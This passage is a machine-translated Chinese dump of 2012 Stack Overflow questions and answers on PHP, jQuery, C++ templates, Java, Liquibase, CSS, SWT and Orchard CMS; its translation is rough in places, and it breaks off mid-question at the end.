  include $path.'header/'.$id;
  $header = ob_get_clean();

  $r
    ->jquery('.advertisement')->html($ads)
    ->jquery('.contentHeader')->html($header)
    ->jquery('.content')->html($content)
    ;
  // etc

  return $r->this()->find('.menuImage')->addClass('menuImageActive'); // set the current menuImage of the LI element to menuImageActive
}

session_start();

Phery::instance()->set(array(
  'load' => 'load'
))->process(); 
```

由于您的 JS 现在性能不佳，因此我重做了：

```
$(function() {
  phery.remote('load');
  var menu_image = $(".menuImage");

  $(document)
  .on('click', '.navigation li', function(event){
    menu_image.removeClass("menuImageActive");
    var top;
    switch (event.currentTarget.id){
      case '1':
        top = "16px";
        break;
      case '2':
        top = "88px";
        break;
      case '3':
        top = "160px";
        break;
      case '4':
        top = "232px";
        break;
      case '5':
        top = "304px";
        break;
      case '6':
        top = "376px";
        break;
    }

    $(event.currentTarget)
    .find(".navigationDart").animate({ top: top }, 500);
  })
  .on('mousedown', '.navigation li', function(event){
    $(event.currentTarget).addClass('menuImageClick');
  })
  .on('mouseup', '.navigation li', function(event){
    $(event.currentTarget).removeClass('menuImageClick');
  });
}); 
```

你`navigation.inc.php`必须是：

```
<div class="navigation">

<ul>
    <li id="1" data-remote="load" data-args="{'id':1}">
        <div id="menuImage1" class="menuImage"></div>
        <div class="menuText"><p>Punkt 1</p></div>

        <div class="navigationDart"></div>
    </li>
    <li id="2" data-remote="load" data-args="{'id':2}">
        <div id="menuImage2" class="menuImage"></div>
        <div class="menuText"><p>Punkt 2</p></div>
    </li>
    <li id="3" data-remote="load" data-args="{'id':3}">
        <div id="menuImage3" class="menuImage"></div>
        <div class="menuText"><p>Punkt 3</p></div>
    </li>
    <li id="4" data-remote="load" data-args="{'id':4}">
        <div id="menuImage4" class="menuImage"></div>
        <div class="menuText"><p>Punkt 4</p></div>
    </li>
    <li id="5" data-remote="load" data-args="{'id':5}">
        <div id="menuImage5" class="menuImage"></div>
        <div class="menuText"><p>Punkt 5</p></div>
    </li>
    <li id="6" data-remote="load" data-args="{'id':6}">
        <div id="menuImage6" class="menuImage"></div>
        <div class="menuText"><p>Punkt 6</p></div>
    </li>
</ul>

</div> 
```

看起来你的 CSS 很复杂，因为你的 HTML 很简单。而且您不应该使用数字作为 ID，ID 必须是在这种情况下，您应该重用 css 类，例如

```
 .menuImageActive {
   /* common styles */  
 }
 .menuImageClick {
   /* common styles */  
 } 
 /* apply per ID */  
 #menuImage1.menuImageActive {
 }
 #menuImage1.menuImageClick {
 }

 #menuImage2.menuImageActive {
 }
 #menuImage2.menuImageClick {
 }

 #menuImage3.menuImageActive {
 }
 #menuImage3.menuImageClick {
 }

 #menuImage4.menuImageActive {
 }
 #menuImage4.menuImageClick {
 }

 #menuImage5.menuImageActive {
 }
 #menuImage5.menuImageClick {
 }

 #menuImage6.menuImageActive {
 }
 #menuImage6.menuImageClick {
 } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:50:10.127

如果您需要动态加载的选项卡，请尝试使用[jQuery UI 选项](http://jqueryui.com/tabs/#ajax)卡，它内置了 AJAX 支持。

如果您想要对 AJAX 事件的后向/前向支持，请尝试使用 jQuery 地址插件。

关于如何在此处使用[带有后退/前进历史记录的 jQuery UI 选项卡](https://stackoverflow.com/a/3330919/129808)有一个很好的答案：

# php - 无法在 PHP 中实现 SNMP 类

> ID：13514581
> 
> 赞同：2
> 
> 时间：2012-11-22T14:16:03.477
> 
> 标签：php, snmp, net-snmp

我想在 PHP 上使用 snmp 类，并在我的服务器上尝试那个[example-1 。](http://www.php.net/manual/en/snmp.get.php)

```
<?php
  $session = new SNMP(SNMP::VERSION_1, "127.0.0.1", "public");
  $sysdescr = $session->get("sysDescr.0");
  echo "$sysdescr\n";
  $sysdescr = $session->get(array("sysDescr.0"));
  print_r($sysdescr);
?> 
```

当我执行这个我得到这个错误：

```
PHP Fatal error:  Class 'SNMP' not found in /var/www/wls/wtest.php on line 2 
```

我用 yum 安装了 snmp 和 php：

```
yum install httpd php php-devel php-snmp net-snmp 
```

我也试图找到原因，但我只找到了图书馆和我的服务器信息：

php-5.3.3-14.el6_3.x86_64 php-snmp-5.3.3-14.el6_3.x86_64 net-snmp-5.5-41.el6_3.1.x86_64

我想原因一定很简单，但我找不到，谢谢你的帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T19:33:31.760

SNMP 类仅在 PHP 5.4 及更高版本中可用，对于 PHP 5.3 及更低版本，您必须改用 SNMP 函数，[http](http://php.net/manual/en/ref.snmp.php) ://php.net/manual/en/ref.snmp.php 。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T16:21:08.537

1.  重启阿帕奇。
2.  检查是否`php-snmp.so`在 中列出`extensions.ini`。
3.  检查中是否有 php-snmp 的部分`phpinfo()`。
4.  检查服务器的日志。

# node.js - SWIG 变量持久性

> ID：13514583
> 
> 赞同：3
> 
> 时间：2012-11-22T14:16:14.197
> 
> 标签：node.js, template-engine, express

我有一个使用[SWIG 模板引擎](https://github.com/paularmstrong/swig)和 express 构建的应用程序。当我发送我的渲染响应时，我发回偶尔为空的变量。我已经使用 swig 注销页面上的这些变量，并且似乎如果它们为空，则使用最后一个已知的非空值。

例如。我开始展示所有的鸟（该应用程序是关于鸟的），类型和子类型设置为空。如果我浏览到“golden eagle”，则节点应用程序会在 swig 用于呈现的响应对象中发送它们的类型和子类型；因此，类型将是“猛禽”，子类型将是“鹰”。当我单击面包屑链接返回“所有鸟类”时，控制台显示我发送了正确的信息（类型和子类型设置为空），但在页面本身 SWIG 将它们记录为仍然是“猛禽”和'鹰'。

在 swig.init 中，我什至将缓存设置为 false，但这似乎并不重要。

有人知道这件事吗？

谢谢

詹姆士

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-07-08T19:31:46.257

使用“设置”标签

“设置一个变量以在当前上下文中重复使用。”

```
{% set foo = "anything!" %}
{{ foo }}
// => anything! 
```

[http://paularmstrong.github.io/swig/docs/tags/#set](http://paularmstrong.github.io/swig/docs/tags/#set)

# java - 带有软键导航的安卓手机资源

> ID：13514585
> 
> 赞同：3
> 
> 时间：2012-11-22T14:16:21.190
> 
> 标签：java, android

为使用软键导航的 Android 手机创建分辨率特定资源的最佳做法是什么？

我可以在 res 文件夹中创建一个特定的目录，还是应该在运行时创建资源？

我对每种分辨率都有特定的资源（目前只支持 2 种分辨率），但是，如果手机有软键，我将需要不同的资源。

我知道这是一个糟糕的设计，但这个决定不取决于我。

提前致谢。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-11-22T22:16:39.373

我找到了解决这个问题的方法。我创建了一个文件夹 values-1184x720 和 values-1280x720。Galaxy S 3 从 1280x720 获取资源，Galaxy Nexus 从 1184x720 获取资源。由于所有带有软键的目标设备都具有与 Galaxy Nexus 相同的分辨率，这解决了我的问题。

软键为 48dp。在 xhdpi 中，这是 96px。因此，在分辨率 1280x720 下，实际屏幕空间为 1184x720。

# php - 一个表的相关字段到另一个表mysql

> ID：13514586
> 
> 赞同：1
> 
> 时间：2012-11-22T14:16:22.047
> 
> 标签：php

> $image1,$image2,$image3,$image4,$image5。与 sku 变量相同

```
 for ($i = 1; $i <= 5; $i++) {
   $test_image = '$image'.$i;
   $test_sku = '$sku'.$i;
   if(strlen($test_image) !=0 && strlen($test_sku) !=0){
     array_push($array,$trend,$test_image,$test_sku);
   }
 } 
```

我想在 if 语句中检查这些变量。上述代码当然不起作用。谁能告诉我如何将所有变量检查到语句中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:19:22.860

我认为这可以通过使用双 $ 来完成：

```
 for ($i = 1; $i <= 5; $i++) {
   $test_image = 'image'.$i;
   $test_sku = 'sku'.$i;
   if(strlen($$test_image) !=0 && strlen($$test_sku) !=0){
     array_push($array,$trend,$$test_image,$$test_sku);
   }
 } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:21:12.747

你可以这样做

```
for ($i = 1; $i <= 5; $i++) {
   $test_image = 'image'.$i;
   $test_sku = 'sku'.$i;
   if(strlen($test_image) !=0 && strlen($test_sku) !=0){
     array_push($array,$trend,$$test_image,$$test_sku);
   }
 } 
```

我认为它对你有帮助

# c++ - c++ 检查模板参数的嵌套 typedef 以获取其标量基类型

> ID：13514587
> 
> 赞同：6
> 
> 时间：2012-11-22T14:16:24.260
> 
> 标签：c++, boost, traits, eigen

考虑下面的指数平滑模板类。此类用于以指数方式平滑/过滤顺序数据（请参阅更新方法）。Elemtype 可能是一个向量，而 Floattype 通常是一个标量。例如

```
ExponentialSmoother<Eigen::Vector2f, float> x(0.1, Vector2f(0.5, 0.5)); 
```

在这个例子中，可以避免第二个模板参数 Floattype，因为 Eigen 的 Matrix 类包含一个嵌套的 typedef 来获取标量基类型：

```
Vector2f::Scalar 
```

将 Elemtype 和 Floatype 都实例化为浮点数以平滑一维数据也是合理的。在这种情况下，也可以跳过第二个模板参数。

```
template <class Elemtype, class Floattype>
class ExponentialSmoother
{
public:
    // ctor
    ExponentialSmoother(Floattype alpha, Elemtype& initial_estimate);

    // getters
    inline const Elemtype& getValue() const {return estimate_;}
    inline const Floattype getAlpha() const {return alpha_;}

    const Elemtype& update(const Elemtype& curr)
    {
       estimate_ = (alpha_ * curr) + (((Floattype)1-alpha) * estimate_);
       return estimate_;
    }

private:
    Elemtype estimate_;
    Floattype alpha_;  // smoothing factor within [0,1]
} 
```

现在我的问题是仅使用一个模板参数（元素类型）来实现 ExponentialSmoother 的“最优雅”的解决方案是什么？它应该适用于特征向量和矩阵，但也适用于浮点类型。

换句话说，是否可以检查 Elemtype::Scalar 是否存在，如果不存在（即 Elemtype 是 float 或 double）将 Floattype 定义为 Elemtype？

一个类似的问题已经被问到[here](https://stackoverflow.com/questions/9644477/how-to-check-whether-a-class-has-specified-nested-class-defination-or-typedef-in)。但是我想知道如果也应该支持 STL 向量，那么最通用的解决方案是什么。所有类型都需要相同的嵌套 typedef（或某些具有一致命名的特征类）吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-22T17:48:33.787

You can use a helper. The link you gave almost contains the solution:

```
template<class T, class R = void>  
struct enable_if_type
{
    typedef R type;
};

template<class E, class Enable = void>
struct GetFloatType
{
    typedef E type;
};

template<class E>
struct GetFloatType<E, typename enable_if_type<typename E::Scalar>::type>
{
    typedef typename E::Scalar type;
}; 
```

Then, in your class:

```
template <class Elemtype, class Floattype = typename GetFloatType<Elemtype>::type>
class ExponentialSmoother
{
    // ...
}; 
```

Also, with this users can still manually provide their float type. You can see it [live](http://ideone.com/BCyK3f). Bonus: works with C++03 without problems.

Note that you can add more partial specializations of `GetFloatType`. [Here is a live example](http://ideone.com/cXNBha). Don´t forget that `ElemType` have to be acceptable for *only one* specialization of `GetFloatType`, or else it will be ambiguous (and cause a compiler error).

# java - 需要创建类型为 TIMESTAMP 但不更新现有行的列

> ID：13514589
> 
> 赞同：0
> 
> 时间：2012-11-22T14:16:26.070
> 
> 标签：java, mysql, sql, liquibase

我有这样的情况：

1.  有现有的表
2.  需要使用添加新列
3.  列的类型是 TIMESTAMP

代码：

```
<changeSet author="name" id="bla-bla-bla">
    <addColumn tableName="table_name">
        <column name="new_col_name" type="TIMESTAMP"/>
    </addColumn>
</changeSet> 
```

这段代码创建列，很酷！但！它还将所有现有行的默认值设置为 0000-00-00 00:00:00。

但我需要保留所有现有行而不做任何更改。并且应该只为新行设置 TIMESTAMPS。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-22T14:54:37.820

A `TIMESTAMP` column in MySQL defaults to `NOT NULL` and that dreaded zero date as the default value ([See the manual](http://dev.mysql.com/doc/refman/5.5/en/timestamp-initialization.html) for details).

The only way I can see how to avoid this, is to modify the generated SQL to include the `DEFAULT NULL` clause in the changeset.

```
<addColumn tableName="foo">
    <column name="new_date" type="TIMESTAMP"/>
</addColumn>
<modifySql>
     <replace replace="TIMESTAMP" with="TIMESTAMP NULL DEFAULT NULL"/>
</modifySql> 
```

Specifying defaultValueDate="NULL" does not seem to work. I guess that's because Liquibase does not know about the `timestamp` quirks of MySQL and thinks it's no necessary to state the obvious - that a column should be filled with `NULL`.

**Edit**

I forgot that this will not work for new rows of course. There are two ways to re-apply the default value using Liquibase:

Adding a second changeSet that changes the default value to `CURRENT_TIMESTAMP`:

```
<sql>
     alter table foo modify new_date timestamp null default current_timestamp
</sql> 
```

Or by not using `DEFAULT NULL` when adding the column, but then running a statement that sets all (existing) rows back to `NULL`. A `sql` tag with `update foo set new_date = null`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-21T09:18:53.003

再一次，我需要修改这段代码。想法是一样的，如何创建新的 Timestamp 列，但所有现有行都应使用当前时间戳进行修改，并且在更新期间仅修改一次，但所有新行都应使用创建时间戳。代码：

```
<changeSet author="name" id="bla-bla-bla">
    <addColumn tableName="table_name">
        <column name="new_col_name" type="TIMESTAMP"/>
    </addColumn>
</changeSet> 
```

此代码为所有现有行创建带有 0000-00-00 时间戳的列。

# java - 获取数据到回调方法

> ID：13514592
> 
> 赞同：0
> 
> 时间：2012-11-22T14:16:33.807
> 
> 标签：java, callback, code-reuse

我有以下代码和体系结构（实际上这是一个非常简化的版本），其中包含一个抽象类和一个具体类。

```
public abstract class AbstractProcessor {
    public void updateDataFromUrl(String url) {
        //Download url
        //Decrypt, and do a lot of stuff, 
        String data = "abc"; //Result from downloading

        String processed = processData(data);

        //Do a lot of other things with the transformed data
    }

    public abstract String processData(String data);
}

final class ConcreteProcessor extends AbstractProcessor {
    public void updateData(int year, int month, int day) {
        String url = String.format("http://%d.%d.%d", year, month, day);
        updateDataFromUrl(url);
    }

    @Override
    public String processData(String data) {
        //Process the data

        //---------------
        //PROBLEM:
        //----------------
        //Need access to year, month, day ....

        return null;
    }
} 
```

该`updateDataFromUrl`方法包含很多`processData`我想在多个处理器中重用的代码（展位，调用之前和之后），因此我将代码放入一个抽象类中。

问题是：**我想访问提供给新添加`updateData`方法的数据（此处`year`为 , `month`, `day`）。当调用流经不知道这些参数的抽象类时，这些信息就会丢失。如何修改此架构以保留此信息？**

我想到了以下解决方案，它们都有明显的缺点：

1.  提供带有 url 的抽象方法并再次从那里提取参数。（问题：有哪些参数我只需要在`procecssData`方法中而不需要在 url 中？）
2.  将该`updateDataFromUrl`方法拆分为两个两个方法（`processData`调用之前的部分和之后的部分）。现在直接在 ConcreteProcessor 中使用这些方法。（问题：该`updateDataFromUrl`方法在调用之前和之后都有很多我需要的上下文`processData`。如何在新创建的方法之间传输这些数据？）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T14:24:40.463

两个想法：

1.  使用实例变量`ConcreteProcessor`来存储年、月、日。两种方法都可以访问对象的实例变量。但是，抽象类无法访问它们。注意：该对象不再是线程安全的。您必须有多个独立的处理器才能同时处理数据。

2.  反转依赖和使用组合。泛型类`Processor`包含通用逻辑。当您调用时，`updateDataFromUrl`您还传递了一个`ProcessingStrategy`实现的实例`processData`（实际上是一种回调）。

可能有几种可能的想法变体。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T14:52:40.967

只有微小的修改会导致这个解决方案（如果我没有错过某个点（未经测试））。

您将获得以下好处：

*   信息传递非常简单（使用实例变量）
*   你保留线程安全
*   从外部（公共）的角度来看，`ConcreteProcessor`可以保持不变

最好不要返回`ConcreteProcessor`from`updateData`而是一些表示转换后的数据的不可变类型。

```
public abstract class AbstractProcessor {
    public void updateDataFromUrl(String url) {
        //Download url
        //Decrypt, and do a lot of stuff, 
        String data = "abc"; //Result from downloading

        String processed = processData(data);

        //Do a lot of other things with the transformed data
    }

    public abstract String processData(String data);
}

final class ConcreteProcessor extends AbstractProcessor {
    public static ConcreteProcessor updateData(int year, int month, int day) {
            ConcreteProcessor p = new ConcreteProcessor(year, month, day);
            p.updateDataFromUrl(url);
            return p;
    }

    private /* instance vars for year, month, day, url, ... */

    private ConcreteProcessor(int year, int month, int day) {
            this.year = year;
            this.month = month;
            this.day = day;
            this.url = String.format("http://%d.%d.%d", year, month, day);
    }

    @Override
    public String processData(String data) {
        //Process the data

        //---------------
        // NO PROBLEM:
        //----------------
        //Easy to access to year, month, day using the instance vars

        return null;
    }
} 
```

但整体概念看起来像一个线性管道，因此最好使管道更明确。您将需要某种状态承载，但我认为使用泛型应该不是什么大问题。

# html - 表格单元格背景颜色和圆角

> ID：13514593
> 
> 赞同：7
> 
> 时间：2012-11-22T14:16:34.197
> 
> 标签：html, css, css-tables

在片段[http://jsfiddle.net/hXMLF/3/](http://jsfiddle.net/hXMLF/3/)中，您会在单元格的白色边框和页面背景之间的角上看到一个小边框。我该如何预防？

HTML

```
<table cellspacing="0" cellpadding="0">
  <tr>
      <td>Test</td>
      <td>Test</td>
  </tr>
</table>​ 
```

CSS

```
body {
    background-color: #efefef;
}

table {
    margin: 10px;
    border-collapse: separate;
    border-spacing: 0px;
}

td {
    border-radius: 5px;
    background-color: #369;
    color: white;
    border: 5px solid white;
}​ 
```

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-11-22T14:22:46.980

我想出了两个解决方案。**使用解决方案 2**，但我也将解决方案 1 保留在这里，因为它可能在其他情况下对其他人有用。

## 解决方案 1：显示

`td`将显示更改为可以解决`inline-block`问题，但可能会影响您在其他地方的实际内容...

```
td {
    display: inline-block; /* this has been added */
    border-radius: 5px;
    background-color: #369;
    color: white;
    border: 5px solid white;
}​ 
```

这是[您为解决方案 1 更改的 JSFiddle](http://jsfiddle.net/hXMLF/7/)。

## 解决方案 2：背景剪辑（推荐）

但是由于您无论如何都在使用 CSS3，这是一个更好的解决方案：

```
td {
    background-clip: padding-box; /* this has been added */
    border-radius: 5px;
    background-color: #369;
    color: white;
    border: 5px solid white;
}​ 
```

这是[您为解决方案 2 更改的 JSFiddle](http://jsfiddle.net/hXMLF/10/)。

如果它不适用于所有浏览器，您应该知道存在特定于浏览器的设置 as`-moz-background-clip`并且`-webkit-background-clip`使用不同的值集（它们基本上省略了*box*和`border-box`）`padding-box``content-box`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T14:21:19.190

发生这种情况是因为

```
border-collapse: separate; 
```

让它这样。表格并不完全是造型的*首要角色*，我建议您尝试使用`<div>`标签。

试试这个：http: [//jsfiddle.net/hXMLF/9/](http://jsfiddle.net/hXMLF/9/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-12T11:00:58.320

检查此链接。您可以为圆角单元格生成 CSS。

**[http://cssround.com/](http://cssround.com/)**

例子：

```
<div 
style="
width:400px;
height:300px;
-webkit-border-radius: 0px 26px 0px 0px;
-moz-border-radius:    0px 26px 0px 0px;
border-radius:         0px 26px 0px 0px;
background-color:#C2E3BF;
-webkit-box-shadow: #B3B3B3 2px 2px 2px;
-moz-box-shadow:    #B3B3B3 2px 2px 2px;
box-shadow:         #B3B3B3 2px 2px 2px;
">

Just modify width and height values to get what you need...

</div> 
```

# java - 方法错误、.class 缺失或无法取消引用 int

> ID：13514596
> 
> 赞同：-1
> 
> 时间：2012-11-22T14:16:53.547
> 
> 标签：java

我觉得我真的很接近用这个类完成我想要完成的事情——但是 getNumbers 方法继续出错——建议我需要 .class 我说 if numbers[i].isValid(i)——如果我改变它我得到“int不能被取消引用”。我的部分任务是表明我可以使用多种方法来完成某事，而且我知道我肯定对此感到不安。任何有关该方法的建议将不胜感激。它试图填充一个数组并验证每个数字都在 0 到 59 之间，并且每个数字都不是重复数字。

```
import java.util.*;

 public class Luck //edited
{
public int numbers[];

public Luck()
{
    numbers = new int[4];
}

public void greeting()
{
    System.out.println("Please enter 5 numbers, each > 0 and < 59.");
}

public void getNumbers()
{
Scanner reader = new Scanner(System.in);
    int count = 0;
    int[] numbers = new int[4];

    while(count<5)
{
    System.out.println("Please enter a number > 0  and < 59");
    for(int i=0; i<5; i++)
    {
        numbers[i] = reader.nextInt();
        if((isValid(numbers[i]) || isNotRepeat(numbers[]))
        {
            count++;
        System.out.println("Number " + count + " is " + numbers[j]);
        }//end second if
        else TryAnother();
        //else TryAgain();
     }//end for
}//end while
}//end method

     public boolean isNotRepeat(int numbers[]) //edited
 {
     for(int i=0; i< 5; i++)
     {
         for(int j=0; j< 5; j++)
         {
         if (i == j)
         return false;

         else return true;
        }//end for
      }//end for
    }

     public boolean isValid (int number)
     {
         number = newNumber;
         if (newNumber < 0 || newNumber > 59)

         return false;
     }

    public void showNumbers(int numbers[])
    {
        int count = 0;
        //int numbers[] = new int[4];
        //int i;

         for(int i=0; i < 5; i++)
         {
         System.out.println("Number " + count + 1 + " is " + numbers[0]);
        }
    }

    public void goodLuck()
    {
        System.out.println("Good luck!");
    }

 }//end class 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:20:04.733

`numbers`是一个`int[]`（数组`int`）。在您的代码中的几个地方，您尝试调用 的元素的方法`numbers`，例如这里：

```
if(numbers[i].isValid(i))

if (numbers[j].isNotRepeat(numbers[])) 
```

那是行不通的，因为你不能调用诸如`isValid`和之类`isNotRepeat`的方法`int`。此外，上面引用的第二行甚至不是有效的 Java 语法（当您尝试传递`numbers[]`给方法时是什么意思？）。

你的意思可能是这样的：

```
if(isValid(numbers[i])) 
```

（方法在哪里`isNotRepeat`？）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:23:20.793

您的代码中有两个明显的错误：

1 您的**构造函数名称**应与您的**类名称**相同。

```
public Luck() 
```

应该

```
public Lucky() 
```

2 你不能在**int 原语**上调用**isValid()**和**isNotRepeat**。

 **如果您只想检查一个数字是否有效，只需执行

```
 if(isValid(i)) or if(isNotReapeat(array)) 
```

## 编辑：

改变

```
if((isValid(numbers[i]) || isNotRepeat(numbers[])) 
```

至

```
 if((isValid(numbers[i]) || isNotRepeat(numbers)) // you dont need the brackets, you only need to pass the reference variable 
```**

# ruby-on-rails - Typo ERB 文件中的 _() 下划线语法来自哪里？

> ID：13514597
> 
> 赞同：1
> 
> 时间：2012-11-22T14:16:59.593
> 
> 标签：ruby-on-rails

我在类型 ERB 文件中看到下划线语法，例如 <%= _("Uploads") %> 我不认识 - 有谁知道支持这个的库是什么 - 它是指 partials 还是什么。 ..？

[https://github.com/fdv/typo/](https://github.com/fdv/typo/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T15:00:10.053

正如评论所说，它确实是本地化功能。

这是Typo 中的[这个](https://github.com/fdv/typo/tree/master/vendor/plugins/localization)插件，你可以在[这里](https://github.com/fdv/typo/blob/master/vendor/plugins/localization/lib/localization.rb)看到实际的方法声明。

# ruby-on-rails - extracting particular text from link using gsub in rails

> ID：13514601
> 
> 赞同：0
> 
> 时间：2012-11-22T14:17:15.103
> 
> 标签：ruby-on-rails, gsub

I have a link by this text,

**s= "http://xyz.com/Getid.ashx?JobID=250920&JobTitle=office+junior&seswitch=1&lid=801&AVSDM=2012-11-22+11%3a33%3a00"**

I need to extract two information from this link

1)JobID which "250920"

2)JobTitle which is "office junior"

Is this possible by using gsub will I be able to get only those text from the link?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:32:15.117

You can try `.match` with a regex:

`result = s.match(/JobID\=(\d+).+JobTitle\=([a-zA-Z+0-9]+)\&/)`

`result[1] #JobID`

`result[2] #JobTile`

# orchardcms - Orchard CMS 为我的内容类型创建主题视图

> ID：13514602
> 
> 赞同：5
> 
> 时间：2012-11-22T14:17:23.280
> 
> 标签：orchardcms

我正在使用带有引导主题的果园 cms。

我创建了一个内容类型：**房子**

它包含**字段**

*   图像（媒体选择器字段）
*   属性类型（分类字段）
*   位置（分类领域）

它有**零件**

*   常见的
*   身体
*   稍后发布
*   标题
*   自动布线

我想要查询房屋并能够为它们选择视图/布局

例如称为**HouseList**的布局（主要用于侧边栏），它将呈现：标题、图像和指向房屋的链接、可能的位置和类型，但默认情况下没有链接。然后是 fullDetails 布局和仅图像布局（所以我可以显示 jquery 图像卷轴一个小部件在四区域中说）**我该如何做这一切**，我已经尝试查看 Content-House.cshtml 等，但我无法访问详细信息 model.content 选择要显示的内容。

我确定当我知道如何做 1 时，我应该能够对其余部分进行排序。我已经阅读了文档等，但是有很多不同的方法，即放置文件，更改部件，内容，创建类来处理显示等。**当然我错过了一些简单**的东西，比如为我想要的每个列表创建一个视图，例如。houue-list、house-details、house-imageONly 然后操作内容。

**请帮助**我一直在尝试不同的事情来让这个网站运行数周而不是很远。例子会很棒，但我已经在谷歌搜索了几个小时，发现类似但没有足够的细节来满足初学者。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T18:50:20.880

这样做的标准方法是放置以移动事物并为不同的部分和字段替换模板。您可以使用显示类型专门化放置和替换，在列表中呈现（例如投影返回的内容）时为摘要，在详细视图中为详细信息。更多关于安置的信息可以在这里找到：http: [//docs.orchardproject.net/Documentation/Understanding-placement-info](http://docs.orchardproject.net/Documentation/Understanding-placement-info)和替代品在这里：[http ://docs.orchardproject.net/Documentation/Alternates](http://docs.orchardproject.net/Documentation/Alternates)

现在，如果您更喜欢完全接管渲染并且不进行放置，这里有一些帖子可能会有所帮助：

[http://weblogs.asp.net/bleroy/archive/2011/07/31/so-you-don-t-want-to-use-placement-info.aspx](http://weblogs.asp.net/bleroy/archive/2011/07/31/so-you-don-t-want-to-use-placement-info.aspx)

[http://weblogs.asp.net/bleroy/archive/2011/03/27/taking-over-list-rendering-in-orchard.aspx](http://weblogs.asp.net/bleroy/archive/2011/03/27/taking-over-list-rendering-in-orchard.aspx)

# java - 如何在 SWT ToolItem 中左对齐文本？

> ID：13514603
> 
> 赞同：4
> 
> 时间：2012-11-22T14:17:26.570
> 
> 标签：java, eclipse, swt

我正在升级 RCP 应用程序以使用 Eclipse 4.2.1。我遇到的问题之一是工具栏中的文本对齐方式发生了变化。

我可以使用改编自标准[SWT 片段](http://git.eclipse.org/c/platform/eclipse.platform.swt.git/tree/examples/org.eclipse.swt.snippets/src/org/eclipse/swt/snippets/Snippet36.java)的以下片段重现该问题。它只是创建一个带有 3 个 ToolItems 的垂直 ToolBar。每个项目都有一个图像和一些文本。

当我在 Eclipse 3.7.2 中运行此代码段时，每个 ToolItem 的文本都是左对齐的。在 Eclipse 4.2.1 中，它是居中对齐的。我希望文本保持左对齐。将样式设置为 SWT.LEFT 没有帮助。有什么建议么？

```
import org.eclipse.swt.SWT;
import org.eclipse.swt.graphics.Color;
import org.eclipse.swt.graphics.GC;
import org.eclipse.swt.graphics.Image;
import org.eclipse.swt.graphics.Rectangle;
import org.eclipse.swt.widgets.Display;
import org.eclipse.swt.widgets.Shell;
import org.eclipse.swt.widgets.ToolBar;
import org.eclipse.swt.widgets.ToolItem;

public class Snippet36 {

  public static void main (final String [] args) {
    Display display = new Display();
    Image image = new Image (display, 16, 16);
    Color color = display.getSystemColor (SWT.COLOR_RED);
    GC gc = new GC (image);
    gc.setBackground (color);
    gc.fillRectangle (image.getBounds ());
    gc.dispose ();
    Shell shell = new Shell (display);
    ToolBar toolBar = new ToolBar (shell, SWT.FLAT | SWT.BORDER | SWT.VERTICAL | SWT.RIGHT);
    Rectangle clientArea = shell.getClientArea ();
    toolBar.setLocation (clientArea.x, clientArea.y);
    String[] labels = new String[] {"Short", "Quite a bit longer", "OK"};
    for (int i=0; i<3; i++) {
      ToolItem item = new ToolItem (toolBar, SWT.PUSH);
      item.setText(labels[i]);
      item.setImage (image);
    }
    toolBar.pack ();
    shell.open ();
    while (!shell.isDisposed()) {
      if (!display.readAndDispatch ()) {
        display.sleep ();
      }
    }
    image.dispose ();
    display.dispose ();
  }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T11:31:31.973

刚刚用 Eclipse 4.2.1 试了一下，这就是我得到的：

![在此处输入图像描述](../Images/c8ff6816239c339f627948b069bf1fa8.png)

一切正常。

您使用的是哪个版本的 SWT？

# c++ - 将数组传递给模板函数

> ID：13514604
> 
> 赞同：2
> 
> 时间：2012-11-22T14:17:28.883
> 
> 标签：c++, templates

我正在尝试制作一个以数组作为参数的模板函数。该函数返回数组中数字的总和。

这是我的代码：

```
template <class var>
var sum_numbers(var array[]) {
    var sum = 0;
    for (int f1=0; array[f1]!='\0'; f1++) {
        sum = sum + array[f1];
    }
    return sum;
} 
```

函数总是返回

```
-2001120059 
```

您能否提供一些想法如何改进我的代码，您能否给我一些参考，在哪里可以找到有关模板的更多信息？

非常感谢你。

更新：我的输入和函数调用：

```
int a[] = {1,2,3,4,5};
cout << sum_numbers(a) << endl; 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-22T14:26:12.343

您的代码似乎期望数组为零终止。没有这样的事情是可以保证的。这只发生在字符串文字上。你的函数实际上并不需要一个数组，它需要一个指针。您不能按值获取数组，但如果您想通过引用获取一个数组，可以这样做：

```
template <class var, size_t N>
var sum_numbers(var (&array)[N]) {
    var sum = 0;
    for (size_t f1=0; f1<N; f1++) {
        sum = sum + array[f1];
    }
    return sum;
} 
```

或者，更简洁地说：

```
template<typename T, size_t N>
T sum_numbers(T (&arr)[N]) {
    return std::accumulate(arr, arr + N, T());
} 
```

或者，如果你想完全通用，并且对 C++11 有很好的支持：

```
template<typename C>
auto sum_numbers(C const & c)
    -> typename std::remove_reference<decltype(*std::begin(c))>::type
{
    typedef typename std::remove_reference<decltype(*std::begin(c))>::type value_type;
    return std::accumulate(std::begin(c), std::end(c), value_type());
} 
```

> 你能给我一些参考，在哪里可以找到有关模板的更多信息？

[请参阅[此列表](https://stackoverflow.com/questions/388242/the-definitive-c-book-guide-and-list)]中的中级和高级书籍。即使是初学者书籍也应该至少给你一个介绍。

# vb.net - 自定义控件 mybase.OnTextChanged 未触发

> ID：13514606
> 
> 赞同：1
> 
